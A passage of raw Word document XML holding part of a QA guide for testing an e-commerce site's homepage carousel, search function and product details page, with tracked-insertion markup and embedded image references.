          <w:ins w:id="1045" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="311E7E23" wp14:editId="79D9CA9F">
            <wp:extent cx="4622165" cy="1205230"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="87" name="Picture 87" descr="Homepage - Hero Image">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page - Hero Image">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22165" cy="1205230"/>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046" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1047" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>This is the kind of the clickable image (a slideshow of sorts) that occupies the majority of the page.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1048" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1049" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>The following are a few things to test:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1050" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1051" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Is it going to auto scroll?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1052" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1053" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>If yes, at what interval will the image be refreshed?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1054" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1055" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>When the user hovers over it, is it still going to scroll to the next one?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1056" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1057" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Can it be hovered on?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1058" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1059" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Can it be clicked on?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1060" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1061" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>If yes, is it taking you to the right page and right deal?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1062" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1063" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Is it loading along with the rest of the page or loads last in comparison to the other elements on the page?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1064" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1065" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Can the rest of the content be viewed?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1066" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1067" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Does it render the same way in different browsers and different screen resolutions?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1068" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1069" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">#2) </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Search</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1070" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1071" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Search algorithms are very important for the success of a retail site because we can’t always place what the users want to see right in front of their eyes.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1072" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1073" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Common tests are:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="171"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1074" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1075" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Search based on Product name, brand name or something more broadly, the category. </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>For example</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t> Camera, Canon EOS 700D, electronics, etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="171"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1076" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1077" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Search Results have to be relevant</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="171"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1078" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1079" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Different sort options have to be available- based on Brand, Price, and Reviews/ratings etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="171"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1080" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1081" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>How many results to display per page?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="171"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1082" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1083" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>For multi-page results, are there options to navigate to them</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="171"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1084" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1085" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Also, search happens in many places. Please take the search drilling down into multiple levels into consideration when validating this functionality. </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>For example:</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t> When I search on the home page, I might see something like this:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1086" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="333F21A9" wp14:editId="17FB1974">
            <wp:extent cx="4622165" cy="340995"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="86" name="Picture 86" descr="Search">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arch">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22165" cy="340995"/>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087" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1088" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>When I navigate to categories and go to a sub-category, maybe movies, this is what I am going to see:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1089" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="170C2E71" wp14:editId="495E5A79">
            <wp:extent cx="4622165" cy="315595"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="85" name="Picture 85" descr="Search 1">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 1">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22165" cy="315595"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1090" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1091" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>#3) Product Details Page:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1092" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1093" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Once a user finds a product either through search or by browsing or by clicking on it from the homepage, the user will be taken to the product information page.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1094" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1095" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Check:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="172"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1096" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1097" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
